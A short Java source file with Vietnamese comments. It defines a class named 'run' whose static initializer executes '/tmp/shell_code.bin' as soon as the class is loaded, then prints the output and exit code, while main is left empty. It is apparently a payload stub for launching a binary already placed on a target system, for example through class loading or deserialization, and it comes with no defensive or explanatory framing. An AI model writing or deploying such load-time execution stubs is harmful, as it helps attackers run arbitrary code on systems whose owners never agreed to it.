import java.io.*;

public class run {
    static {
        try {
            String cmd = "/tmp/shell_code.bin";
            Process proc = Runtime.getRuntime().exec(cmd);
            int exitCode = proc.waitFor();

            // Đọc output (nếu cần)
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            System.out.println("Exit code: " + exitCode);
        } catch(Exception e) {
            e.printStackTrace();  // Hiển thị lỗi
        }
    }

    public static void main(String[] args) {
    }
}
